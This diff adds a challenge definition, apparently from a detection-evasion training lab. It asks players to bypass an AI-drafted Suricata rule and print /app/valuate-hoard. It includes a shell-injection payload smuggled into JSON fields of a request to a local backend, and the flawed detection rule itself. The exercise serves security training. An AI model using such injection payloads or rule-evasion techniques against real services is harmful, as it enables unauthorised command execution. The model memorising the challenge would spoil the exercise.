@@ -1,0 +1,58 @@
+name: 'Shell Injection (JSON) (AI)'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  I created this rule using the following prompt:
+
+  ```
+  Can you write a Suricata rule that'll detect the follow shell command injection vulnerability in this JSON API?
+
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 98
+
+  {
+  "hoardType": "artifact",
+  "gold": "10';cat /app/valuate-hoard; echo '",
+  "gems": "20",
+  "artifacts": "30"
+  }
+  ```
+
+  Then, to be nice, I gave it some additional context:
+
+  ```
+  The "gems" and "artifacts" fields are vulnerability to the same shell command injection, can you make sure they match as well?
+  ```
+
+  Then I manually fixed the syntax error (where it failed to escape the semicolon correctly) and the rule is below!
+
+  **Goal: Print /app/valuate-hoard**
+
+hints: []
+
+target: hoard
+
+base_request: |-
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 98
+
+  {
+    "hoardType": "artifact",
+    "gold": "10';cat /app/valuate-hoard; echo '",
+    "gems": "20",
+    "artifacts": "30"
+  }
+
+rules:
+# Lots of problems, including newlines and missing symbols
+- >
+  alert http any any -> any any ( msg:"JSON API Command Injection in Treasure Fields"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/backend.php"; http.header; content:"Content-Type: application/json"; nocase; http.request_body; content:"\":"; nocase; fast_pattern; pcre:"/\"(gold|gems|artifacts)\"\s*:\s*\"[^\"]*?([\;`]|%3b|%60)/i"; classtype:web-application-attack; sid:1000008; rev:2;)
+
+expected_output: "Perform some math"
